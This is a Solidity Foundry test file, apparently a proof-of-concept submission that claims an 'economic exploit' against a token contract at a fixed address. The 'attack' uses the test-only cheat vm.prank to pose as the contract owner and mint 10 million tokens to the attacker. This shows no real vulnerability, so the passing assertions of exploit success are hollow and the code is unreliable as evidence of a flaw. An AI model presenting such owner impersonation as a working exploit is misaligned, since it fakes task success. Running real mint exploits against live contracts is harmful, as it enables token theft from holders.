// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Solar {
    function mint(address _to, uint256 _amount) external;
    function owner() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = Solar(TARGET).owner();

        // Record initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);
        Solar(TARGET).mint(attacker, 10_000_000 * 1e18);

        // Verify balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance should increase after minting");

        // Optional: verify we minted the expected amount
        assertEq(finalBalance - initialBalance, 10_000_000 * 1e18, "Should have minted exactly 10 million tokens");

        // Verify economic exploit
        uint256 finalTargetBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalTargetBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
